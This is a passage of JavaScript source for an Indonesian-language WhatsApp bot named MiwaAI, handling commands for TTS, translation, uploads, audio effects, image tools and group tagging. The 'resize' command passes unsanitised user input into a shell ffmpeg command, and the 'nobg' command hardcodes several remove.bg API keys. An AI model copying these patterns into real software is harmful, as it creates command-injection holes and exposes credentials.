						'hanae', 'hanako', 'hare', 'haruka', 'haruna', 'hasumi', 'hibiki', 'hihumi', 'himari', 
						'hina', 'hinata', 'hiyori', 'hoshino', 'iori', 'iroha', 'izumi', 'izuna', 'juri', 
						'kaede', 'karin', 'kayoko', 'kazusa', 'kirino', 'koharu', 'kokona', 'kotama', 
						'kotori', 'main', 'maki', 'mari', 'marina', 'mashiro', 'michiru', 'midori', 'miku', 
						'mimori', 'misaki', 'miyako', 'miyu', 'moe', 'momoi', 'momoka', 'mutsuki', 'NP0013', 
						'natsu', 'neru', 'noa', 'nodoka', 'nonomi', 'pina', 'rin', 'saki', 'saori', 'saya', 
						'sena', 'serika', 'serina', 'shigure', 'shimiko', 'shiroko', 'shizuko', 'shun', 
						'ShunBaby', 'sora', 'sumire', 'suzumi', 'tomoe', 'tsubaki', 'tsurugi', 'ui', 'utaha', 
						'wakamo', 'yoshimi', 'yuuka', 'yuzu', 'zunko'
					];
					if (!suppVoice.includes(char.toLowerCase())) {
						const txtVoice = suppVoice
							.map(name => name.charAt(0).toUpperCase() + name.slice(1))
							.sort()
							.map(name => `- ${name}`)
							.join('\n');
						return newReply(`Hmm, karakter yang Kamu pilih gak ada nih! 😢\nCoba pilih salah satu dari daftar ini ya:\n${txtVoice}`);
					}
					newReply('Tunggu sebentar ya kak, MiwaAI lagi proses nih! 🥰');	
					const ba = new BlueArchive();
					const translated = await translate(message, { to: 'ja', autoCorrect: false });
					const result = await ba.voice(translated[0], char.charAt(0).toUpperCase() + char.slice(1), speed || 1);
					sock.sendMessage(m.chat, { audio: { url: result.result.url }, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
				} catch (err) {
					console.error(err);
					newReply('Aduh kak, ada yang error nih, maaf banget ya! Coba ulang lagi nanti! 😔');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'tts':
			case 'texttosound':
			case 'audio':
			case 'say': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Yahh, maaf kak, limit Kamu udah habis. Kalau mau lebih banyak, coba upgrade ke premium yuk! 🥺');
				if (!isPremium) return newReply('Fitur ini cuma buat yang premium kak, coba upgrade dulu ya biar bisa akses semuanya! 😇');
				if (!text) return newReply(`Cara pakenya gini kak:\n${prefix + command} text\n\n*Kirim perintah*: ${prefix + command} yaya 😁`);
				let lang = text.split("--")[1];
				try {
					if (!lang) lang = 'id'; // Bahasa default
					long = 'id';
					function tts(text, long = 'id') {
						return new Promise((resolve, reject) => {
							try {
								let tts = gtts(long);
								let filePath = path.join(__dirname, './temp', (1 * new Date) + '.wav');
								tts.save(filePath, text, () => {
									resolve(fs.readFileSync(filePath));
									fs.unlinkSync(filePath);
								});
							} catch (e) {
								reject(e);
							}
						});
					}
					let res;
					try {
						res = await tts(text, long);
					} catch (e) {
						newReply('Hmm, ada yang salah nih, coba lagi ya! 🥲');
						res = await tts(text);
					} finally {
						const sendAudio = {
							audio: res,
							mimetype: 'audio/mpeg'
						};
						if (/say/.test(command)) sendAudio.ptt = true; // Mode voice note
						sock.sendMessage(m.chat, sendAudio, { quoted: m });
					}
				} catch (error) {
					console.log(error);
					newReply('Aduh kak, error nih. MiwaAI gak sengaja, coba lagi ya! 🙏');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'translate':
			case 'tr': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply('Yahh, limit Kamu habis nih. Coba upgrade premium ya, biar lebih bebas! 😊');
				if (!text) return newReply(`Kak, cara pakainya gini ya:\n\n1. Kirim perintah ${prefix + command} *kode bahasa* *message*\n•*Kirim perintah*: ${prefix + command} id Hello\n\n2. Balas chat dengan caption ${prefix + command} *kode bahasa*\n•*Kirim perintah*: ${prefix + command} en halo\n\nDaftar bahasa lengkap bisa cek di sini kak: https://cloud.google.com/translate/docs/languages`);
				try {
					let message = m.quoted ? m.quoted.text : text.split(args[0])[1];
					if (!message) return newReply('Hmm, kayaknya teksnya kurang lengkap deh kak. Coba dicek lagi ya! 🧐');
					const result = await translate(message, { to: args[0] });
					newReply(`Hasil terjemahan:\n\n${result.text} 😊`);
				} catch (error) {
					console.log(error);
					newReply('Yahh, MiwaAI gak sengaja bikin error nih kak. Coba ulang lagi ya! 🙏');
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'tourl': {
				let captionText = `Halo Kak ${pushname}! 🎉\n\nSaat ini, hanya server *8030* yang aktif untuk mengunggah gambar.\n\nPilih server *8030* untuk mengunggah gambar Kamu. Pilih salah satu opsi di bawah ini ya! 🌟`;
				let button = [{
					"name": "single_select",
					"buttonParamsJson": `{
						"title": "Pilih Server untuk Upload",
						"sections": [{
							"title": "Pilih Server",
							"rows": [{
								"header": "Catbox",
								"title": "Mengunggah ke server Catbox! 🐱",
								"id": "${prefix}uploadcatbox"
							},
							{
								"header": "8030",
								"title": "Mengunggah ke server 8030! 🎞️",
								"id": "${prefix}uploadfile"
							},
							{
								"header": "Telegraph",
								"title": "Mengunggah ke server Telegraph! 🌐",
								"id": "${prefix}uploadtelegraph"
							},
							{
								"header": "Pomf",
								"title": "Mengunggah ke server Pomf! 🔥",
								"id": "${prefix}uploadpomf"
							},
							{
								"header": "GitHub",
								"title": "Mengunggah ke server GitHub! 💻",
								"id": "${prefix}uploadgithub"
							},
							{
								"header": "ImgBB",
								"title": "Mengunggah ke server ImgBB! 🖼️",
								"id": "${prefix}uploadimgbb"
							},
							{
								"header": "TinyURL",
								"title": "Mengunggah ke server TinyURL! 🌍",
								"id": "${prefix}uploadtinyurl"
							}]
						}]
					}`
				}];
				sock.sendButtonText(m.chat, button, captionText, footer, m);
			}
			break;

			case 'uploadcatbox': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!mime) return newReply(`Kirim/Reply Video/Gambar Dengan Caption ${prefix + command}`);
				await m.react('⏱️');
				try {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let data = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = m.pushName;
						let caption = `🔗 *Link Media*: ${data}\n📅 *Tanggal Upload*: ${uploadDate}\n📂 *Ukuran File*: ${fileSize} KB\n👤 *Pengunggah*: ${uploader}`.trim();
						newReply(caption);
					} else if (!/image/.test(mime)) {
						let data = await CatBox(media);
						await newReply(data);
					} else {
						newReply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					newReply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'uploadfile': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply("Fitur ini khusus buat pengguna premium aja, kak! Yuk upgrade sekarang juga biar bisa pakai fitur ini 😊.");
				if (!mime) return newReply(`Kirim/Reply Video/Gambar Dengan Caption ${prefix + command}`);
				await m.react('⏱️');
				try {
					let media = await sock.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let data = await uploadFile(media);
						let resultUrl = data;
						if (resultUrl) {
							let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
							let uploadDate = new Date().toLocaleString();
							let uploader = m.sender.replace('@s.whatsapp.net','');
							let caption = `🔗 *Link Media*: ${resultUrl}\n📅 *Tanggal Upload*: ${uploadDate}\n📂 *Ukuran File*: ${fileSize} KB\n👤 *Pengunggah*: @${uploader}`.trim();
							newReply(caption);
						} else {
							newReply("Gagal mendapatkan URL dari server.");
						}
					} else {
						newReply(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					newReply("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'toimage': 
			case 'toimg': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!quoted) return newReply('Reply Image')
				if (!/webp/.test(mime)) return newReply(`Reply sticker dengan caption *${prefix + command}*`)
				await m.react('⏱️');
				let media = await sock.downloadAndSaveMediaMessage(quoted)
				let ran = await getRandom('.png')
				exec(`ffmpeg -i ${media} ${ran}`, (err) => {
					fs.unlinkSync(media)
					if (err) throw err
					let buffer = fs.readFileSync(ran)
					sock.sendMessage(m.chat, { image: buffer }, { quoted: m })
					fs.unlinkSync(ran)
				})
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'imageupscaler':
			case 'imageup':
			case 'upscale':
			case 'upimg':
			case 'hdr':
			case 'hd': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (m.sender in enhance) return newReply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				let q = m.quoted ? m.quoted : m;
				let mime = (q.msg || q).mimetype || q.mediaType || "";
				if (!mime) return newReply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`);
				if (!/image\/(jpe?g|png)/.test(mime)) 
					return newReply(`Media tidak support!`);
				enhance[m.sender] = true;
				try {
					const availableScales = [2, 4, 6];
					await m.react('⏱️');
					let media = await q.download();
					let scale = availableScales.includes(parseInt(text)) ? parseInt(text) : 2;
					let tag = `@${m.sender.split("@")[0]}`;		
					let result = await upscale(media, scale);
					let caption = "🌟 *Effect*: HD\n";
					caption += `📩 *Requested by*: ${tag}\n`;
					caption += `✨ *Source*: imageupscaler.com\n`;
					caption += `🔍 *Skala*: ${scale}\n`;
					caption += `📏 *Available Scales*: ${availableScales.join(", ")}\n\n`;
					caption += "Terima kasih sudah menggunakan fitur ini ya, Kak! 😊";
					await m.react('✅');
					await sock.sendMessage(m.chat, {
						image: { url: result },
						caption: caption,
						mentions: [m.sender]
					}, { 
						quoted: m 
					});
				} catch (error) {
					console.error(error);
					newReply("❌ Ups, terjadi kesalahan saat memproses gambar. Coba lagi nanti ya, Kak!");
				}
				delete enhance[m.sender];
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'nobg':
			case 'imagenobg':
			case 'removebg':
			case 'remove-bg': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!/image/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				if (/webp/.test(mime)) return newReply(`Kirim/Reply Image Dengan Caption ${prefix + command}`);
				let remobg = require('remove.bg');
				let apirnobg = ["pvmbuSzyrip1ksmj9otVSogd", "jGaBWNXPP8LXV6KW3ovBWozE", "kqWaDsZLxMk2kh9MJu5u7ceP", "kDhVMX7eoByik5hFomEdMDVs", "c7J5ityXePPqxARTMRpohJvj","xu2pZRhdyddJx48BrN9ntvjD","FAKQ7AtfrADtGmLsWVG9s9Yu","3eoq8Bd1JUxEU3Gi5AAmtxZ1"]
				try {
					let apinobg = await pickRandom(apirnobg)
					hmm = await 'remobg-' + getRandom('')
					localFile = await sock.downloadAndSaveMediaMessage(quoted, hmm)
					outputFile = await './temp/hremo-' + getRandom('.png')
					await remobg.removeBackgroundFromImageFile({
						path: localFile,
						apiKey: apinobg,
						size: "regular",
						type: "auto",
						scale: "100%",
						outputFile
					}).then(async result => {
						sock.sendMessage(m.chat, {
							image: fs.readFileSync(outputFile),
							caption: mess.done
						}, {
							quoted: m
						})
						await fs.unlinkSync(localFile)
						await fs.unlinkSync(outputFile)
					})
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break

			case 'resize': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!isPremium) return newReply(mess.premium);
				if (!q) return newReply(`Masukan ukuran panjangxlebar, contoh ${prefix+command} 300x300`)
				await m.react('⏳');
				let panjang = q.split('x')[0];
				let lebar = q.split('x')[1];
				try {
					let media = await sock.downloadAndSaveMediaMessage(quoted)
					let ran = getRandom('.jpeg')
					exec(`ffmpeg -i ${media} -vf scale=${panjang}:${lebar} ${ran}`, async (err) => {
						fs.unlinkSync(media)
						if (err) return m.reply(`Err: ${err}`)
						let buffer453 = fs.readFileSync(ran)
						await sock.sendMessage(m.chat, {
							mimetype: 'image/jpeg',
							image: buffer453,
							caption: mess.done
						}, {
							quoted: m
						})
						fs.unlinkSync(ran)
					})
				} catch (error) {
					console.log(error);
					newReply('Gagal saat melakukan tindakan, jika anda pemilik silahkan cek console.');
				};
			}
			db.data.users[m.sender].limit -= 1;
			break

			case "remini":
			case "enhance": {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (m.sender in enhance) return newReply(`Masih ada proses yang belum diselesaikan, mohon tunggu sampai proses selesai.`);
				let q = m.quoted ? m.quoted : m;
				let mime = (q.msg || q).mimetype || q.mediaType || "";
				if (!mime) return newReply(`Kirim/Balas Gambar Dengan Caption ${prefix + command}`);
				if (!/image\/(jpe?g|png)/.test(mime)) return newReply(`Media tidak support!`);
				enhance[m.sender] = true;
				const method = args[0]?.toLowerCase();
				const validMethods = ["enhance", "recolor", "dehaze"];
				const selectedMethod = validMethods.includes(method) ? method : "enhance";
				newReply(`⏳ Sedang memproses gambar menggunakan metode *${selectedMethod}*, harap tunggu...`);
				try {
					const media = await sock.downloadMediaMessage(m.quoted);
					const enhancedImage = await remini(media, selectedMethod);
					if (!enhancedImage) {
						return newReply("❌ Gagal memproses gambar. Coba lagi nanti!");
					}
					const filename = `${selectedMethod}_result.jpg`;
					await sock.sendMessage(m.chat, { image: enhancedImage, caption: `✨ Gambar berhasil ditingkatkan menggunakan metode *${selectedMethod}*` }, { quoted: m });
				} catch (error) {
					console.error(error);
					newReply("❌ Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
				}
				delete enhance[m.sender];
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'fetch': case 'get': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Yah kak, limitnya udah habis nih 😢. Yuk upgrade ke premium biar bebas pakai fitur ini! ✨");
				if (!isPremium) return newReply(mess.premium);
				if (!text.startsWith('http')) return newReply(`Hmm, Kamu lupa kasih linknya ya? 😅\n\n*Contoh*: ${prefix + command} https://www.google.com`);
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text);
					const contentType = res.headers['content-type'] || '';
					if (!isCreator && !contentType.includes('text/html')) {
						return newReply("Ups, konten ini bukan HTML dan Kamu bukan owner ya. Jadi gak bisa akses. 😔");
					}
					if (isCreator || contentType.includes('text/html')) {
						return newReply(`Nih kak, hasilnya:\n\n${util.format(res.data)} 😊`);
					} else {
						return newReply("Maaf kak, konten ini bukan HTML jadi gak bisa diambil. 😢");
					}
				} catch (e) {
					return newReply(`Aduh, ada error nih kak 😟\n${util.format(e)}\nCoba lagi ya!`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'toptv': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Yah, limit Kamu udah habis nih 😔. Yuk upgrade ke premium biar limit gak cepet habis! 😊");
				if (!isPremium) return newReply(mess.premium);
				let q = m.quoted ? m.quoted : m;
				if (!/video|audio/.test(mime)) return newReply(`Hmm, Kamu harus balas video atau voice note yang mau dijadikan MP3 ya, jangan lupa pakai caption *${prefix + command}* 😉`);
				try {
					let media = await q.download();
					let dataVideo = {
						ptvMessage: m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage
					};
					sock.relayMessage(m.chat, dataVideo, {});
				} catch (error) {
					console.log(error);
					newReply("Aduh, ada yang salah nih kak 😟. Coba lagi ya!");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'tovn': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Kak, limitnya udah habis nih 😢. Yuk coba upgrade biar bebas pakai fitur premium! ✨");
				if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Kak, harus balas video atau VN yang mau dijadikan MP3 ya, jangan lupa pakai caption *${prefix + command}* 😊`);
				if (!quoted) return newReply(`Hmm, pastikan Kamu balas video atau VN dengan caption *${prefix + command}* ya 😉`);
				try {
					let media = await quoted.download();
					let audio = await toAudio(media, 'mp4');
					sock.sendMessage(m.chat, {
						audio,
						mimetype: 'audio/mpeg',
						ptt: true
					}, {
						quoted: m
					});
				} catch (error) {
					console.log(error);
					newReply("Yah, ada error kak 😟. Coba ulang lagi ya, MiwaAI bantu kok!");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'tinyurl': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply("Yah kak, limitnya udah habis nih 😢. Upgrade ke premium biar bisa terus pakai fitur ini ya! ✨");
				if (!isPremium) return newReply(mess.premium);
				if (!text) return newReply(`Cara pakainya gampang kok, kak! Ketik: *${prefix + command} link*\n\n*Kirim perintah*: *${prefix + command} https://google.com* 😊`);
				if (!isUrl(text)) return newReply(`Hmmm, MiwaAI cuma bisa proses link yang valid ya, kak! Jangan lupa formatnya seperti ini: *${prefix + command} https://google.com* 😉`);
				try {
					let tiny = await axios.get(`https://tinyurl.com/api-create.php?url=${text}`);
					let data = tiny.data;
					await newReply(`Tadaaa! Ini link pendeknya, kak: ${data} 😊`);
				} catch (error) {
					console.log(error);
					newReply("Aduh, ada error kak 😟. Coba lagi ya, MiwaAI yakin bisa bantu! ✨");
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'toaudio': 
			case 'tomp3': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!/video/.test(mime) && !/audio/.test(mime)) return newReply(`Reply Video/VN yang ingin dijadikan MP3 dengan caption ${prefix + command}`);
				if (!quoted) return newReply(`Reply Video/VN yang ingin dijadikan MP3 dengan caption ${prefix + command}`);
				try {
					await m.react('⏱️');
					let media = await quoted.download();
					let audioBuffer = await toAudio(media, 'mp4');
					await sock.sendMessage(m.chat, { 
						audio: audioBuffer, 
						mimetype: 'audio/mpeg'
					}, { quoted: m });
						newReply(`✅ Berhasil mengonversi ke MP3! 🎵`);
				} catch (err) {
					console.error('❌ Error:', err);
					newReply(`❌ Gagal mengonversi ke MP3. Cek konsol untuk detailnya.`);
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;

			case 'bass': 
			case 'blown': 
			case 'deep': 
			case 'earrape': 
			case 'fast': 
			case 'fat': 
			case 'nightcore': 
			case 'reverse': 
			case 'robot': 
			case 'slow': 
			case 'smooth': 
			case 'squirrel': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(`⚠️ Hai kak, limit Kamu habis nih! Yuk, upgrade ke premium biar bisa terus pakai fitur ini. 😊`);
				try {
					let set;
					if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20';
					if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log';
					if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3';
					if (/earrape/.test(command)) set = '-af volume=12';
					if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"';
					if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"';
					if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25';
					if (/reverse/.test(command)) set = '-filter_complex "areverse"';
					if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"';
					if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"';
					if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"';
					if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"';
					if (/audio/.test(mime)) {
						await m.react('⏱️');
						let media = await sock.downloadAndSaveMediaMessage(quoted);
						let ran = getRandom('.mp3');
						exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
							fs.unlinkSync(media);
							if (err) return newReply(`⚠️ Ups, ada yang salah saat memproses audio. Coba lagi nanti ya, kak! 🙏`);
							let buff = fs.readFileSync(ran);
							sock.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted: m });
							fs.unlinkSync(ran);
							newReply(`✅ Audio berhasil diubah dengan efek *${command}*! Semoga suka ya, kak! 🎶`);
						});
					} else {
						newReply(`⚠️ Tolong reply ke audio yang mau diubah dengan caption *${prefix + command}* ya, kak! 🎧`);
					}
				} catch (e) {
					newReply(`⚠️ Ada kesalahan nih, kak: ${e}. Coba lagi nanti ya! 🙏`);
				}
				db.data.users[m.sender].limit -= 1;
				break;
			}

			case 'listbadword': {
				let teks = '*🌟 Daftar Kata Terlarang 🌟*\n\n';
				teks += bad.map((word, index) => `- ${index + 1}. ${word}`).join('\n');
				teks += `\n\n✨ Total: *${bad.length}* kata`;

				newReply(teks);
				break;
			}

			case 'afk': {
				if (!m.isGroup) return newReply(`⚠️ Perintah ini hanya bisa digunakan di grup, ya kak! 😊`);
				if (isBot) return;
				if (isAfkOn) return;
				let reason = text ? text : 'Nggak ada alasan yang disebutkan~ 🤭';
				addAfkUser(m.sender, Date.now(), reason, afk);
				let afkText = '🌙 *AFK Mode Aktif!* 🌙\n';
				afkText += `👤 *@${m.sender.split('@')[0]}* lagi AFK nih!\n`;
				afkText += `💬 *Alasan*: ${reason}\n\n`;
				afkText += `Jangan lupa balik lagi ya~ MiwaAI kangen nih! 😊✨`;
				sock.sendTextWithMentions(m.chat, afkText, m);
				break;
			}

			case 'tagall': {
				if (!m.isGroup) return newReply(`Fitur ini hanya bisa digunakan di grup ya, kak!`)
				if (!isAdmins && !isGroupOwner && !isCreator) return newReply(`Maaf, kak! Kamu harus jadi admin dulu buat pakai fitur ini.`)
				if (!isBotAdmins) return newReply(`Aku harus jadi admin dulu untuk menjalankan perintah ini. Tolong jadikan aku admin ya!`)
				let pengirim = m.sender
				let teks = `🌸 *Tag All Anggota Grup* 🌸\n\n`
				teks += `📢 *Penanda:* @${pengirim.split('@')[0]}\n`
				teks += `📩 *Pesan:* ${q ? q : 'Tidak ada pesan khusus nih!'}\n\n`
				for (let member of participants) {
					teks += `- @${member.id.split('@')[0]}\n`
				}
				sock.sendMessage(m.chat, {
					text: teks,
					mentions: participants.map(member => member.id)
				}, { quoted: m })
			}
			break

			case 'h':
			case 'hidetag': {
				if (!m.isGroup) return newReply(mess.group);
				if (!isAdmins && !isCreator) return newReply(mess.admin);
				if (m.quoted) {
					sock.sendMessage(m.chat, {
						forward: m.quoted.fakeObj,
						mentions: participants.map(a => a.id)
					})
				}
				if (!m.quoted) {
					sock.sendMessage(m.chat, {
						text: text ? text : '',
						mentions: participants.map(a => a.id)
					}, {
						quoted: fconver
					})
				}
			}
			break

			case 'delete':
			case 'd':
			case 'del': {
				if (!m.quoted) return newReply('Kak, Kamu perlu mengirim pesan yang mau dihapus ya! 🤔')
				await sock.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						id: m.quoted.id,
						participant: m.quoted.sender
					}
				})
			}
			break

			case 'autoswview':
			case 'autostatusview':{
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					autoswview = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					autoswview = false
					await newReply(mess.done);
				}
			}
			break;

			case 'anticall': {
				if (!isCreator) return newReply(mess.owner);
				if (args.length < 1) return newReply(`❗ *Kirim perintah*:\n${prefix + command} true/false`)
				if (args[0] === 'true') {
					anticall = true
					await newReply(mess.done);
				} else if (args[0] === 'false') {
					anticall = false
					await newReply(mess.done);
				}
			}
			break;

			case 'addvideo': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama video belum disebutkan, kak!');
				if (videonye.includes(q)) return newReply('⚠️ Nama ini sudah ada dalam database.');
				let filePath = await sock.downloadAndSaveMediaMessage(quoted);
				videonye.push(q);
				await fsx.copy(filePath, `./media/${q}.mp4`);
				fs.writeFileSync('./media/database/video.json', JSON.stringify(videonye));
				fs.unlinkSync(filePath);
				newReply('✅ Video berhasil ditambahkan ke database!');
				break;
			}

			case 'delvideo': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama video yang ingin dihapus belum disebutkan, kak!');
				if (!videonye.includes(q)) return newReply('⚠️ Nama ini tidak ada dalam database.');
				let index = videonye.indexOf(q);
				videonye.splice(index, 1);
				fs.writeFileSync('./media/database/video.json', JSON.stringify(videonye));
				fs.unlinkSync(`./media/${q}.mp4`);
				newReply('✅ Video berhasil dihapus dari database!');
				break;
			}

			case 'listvideo': {
				let teks = '*🎥 Daftar Video Tersimpan 🎥*\n\n';
				teks += videonye.map((video, i) => `- ${i + 1}. ${video}`).join('\n');
				teks += `\n\n✨ Total: *${videonye.length}* video.`;
				newReply(teks);
				break;
			}

			case 'addimage': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama gambar belum disebutkan, kak!');
				if (imagenye.includes(q)) return newReply('⚠️ Nama ini sudah ada dalam database.');
				let filePath = await sock.downloadAndSaveMediaMessage(quoted);
				imagenye.push(q);
				await fsx.copy(filePath, `./media/${q}.jpg`);
				fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenye));
				fs.unlinkSync(filePath);
				newReply('✅ Gambar berhasil ditambahkan ke database!');
				break;
			}

			case 'delimage': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama gambar yang ingin dihapus belum disebutkan, kak!');
				if (!imagenye.includes(q)) return newReply('⚠️ Nama ini tidak ada dalam database.');
				let index = imagenye.indexOf(q);
				imagenye.splice(index, 1);
				fs.writeFileSync('./media/database/image.json', JSON.stringify(imagenye));
				fs.unlinkSync(`./media/${q}.jpg`);
				newReply('✅ Gambar berhasil dihapus dari database!');
				break;
			}

			case 'listimage': {
				let teks = '*🖼️ Daftar Gambar Tersimpan 🖼️*\n\n';
				teks += imagenye.map((image, i) => `- ${i + 1}. ${image}`).join('\n');
				teks += `\n\n✨ Total: *${imagenye.length}* gambar.`;
				newReply(teks);
				break;
			}

			case 'addsticker': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama stiker belum disebutkan, kak!');
				if (setiker.includes(q)) return newReply('⚠️ Nama ini sudah ada dalam database.');
				let filePath = await sock.downloadAndSaveMediaMessage(quoted);
				setiker.push(q);
				await fsx.copy(filePath, `./media/${q}.webp`);
				fs.writeFileSync('./media/database/sticker.json', JSON.stringify(setiker));
				fs.unlinkSync(filePath);
				newReply('✅ Stiker berhasil ditambahkan ke database!');
				break;
			}

			case 'delsticker': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama stiker yang ingin dihapus belum disebutkan, kak!');
				if (!setiker.includes(q)) return newReply('⚠️ Nama ini tidak ada dalam database.');
				let index = setiker.indexOf(q);
				setiker.splice(index, 1);
				fs.writeFileSync('./media/database/sticker.json', JSON.stringify(setiker));
				fs.unlinkSync(`./media/${q}.webp`);
				newReply('✅ Stiker berhasil dihapus dari database!');
				break;
			}

			case 'liststicker': {
				let teks = '*🌟 Daftar Stiker Tersimpan 🌟*\n\n';
				teks += setiker.map((sticker, i) => `- ${i + 1}. ${sticker}`).join('\n');
				teks += `\n\n✨ Total: *${setiker.length}* stiker.`;
				newReply(teks);
				break;
			}

			case 'addvn': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama audio belum disebutkan, kak!');
				if (audionye.includes(q)) return newReply('⚠️ Nama ini sudah ada dalam database.');
				let filePath = await sock.downloadAndSaveMediaMessage(quoted);
				audionye.push(q);
				await fsx.copy(filePath, `./media/${q}.mp3`);
				fs.writeFileSync('./media/database/audio.json', JSON.stringify(audionye));
				fs.unlinkSync(filePath);
				newReply('✅ Audio berhasil ditambahkan ke database!');
				break;
			}

			case 'delvn': {
				if (!isCreator) return newReply('⚠️ Perintah ini hanya untuk pemilik bot.');
				if (!q) return newReply('❓ Nama audio yang ingin dihapus belum disebutkan, kak!');
				if (!audionye.includes(q)) return newReply('⚠️ Nama ini tidak ada dalam database.');
				let index = audionye.indexOf(q);
				audionye.splice(index, 1);
				fs.writeFileSync('./media/database/audio.json', JSON.stringify(audionye));
				fs.unlinkSync(`./media/${q}.mp3`);
				newReply('✅ Audio berhasil dihapus dari database!');
				break;
			}

			case 'listvn': {
				let teks = '*🎶 Daftar Audio Tersimpan 🎶*\n\n';
				teks += audionye.map((audio, i) => `- ${i + 1}. ${audio}`).join('\n');
				teks += `\n\n✨ Total: *${audionye.length}* audio.`;
				newReply(teks);
				break;
			}

			case 'q':
			case 'quoted': {
				if (!quoted) return newReply(`Mohon reply pesan yang ingin di quoted ya kak! 🙏`);
				let gwm = await sock.serializeM(await m.getQuotedObj());
				if (!gwm.quoted) return newReply(mess.error);
				try {
					await gwm.quoted.copyNForward(m.chat, true);
				} catch (err) {
					console.log(err);
					newReply(mess.error);
				}
			};
			break

			case 'yts': 
			case 'ytsearch': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return newReply(mess.limit);
				if (!text) return newReply(`🔍 *Judul atau kata kunci videonya mana, Kak?*\n\nContoh:\n${prefix + command} story wa anime`);
				try {
					await m.react('⏳');
					let search = await yts(text);
					if (!search || !search.videos || search.videos.length === 0) {
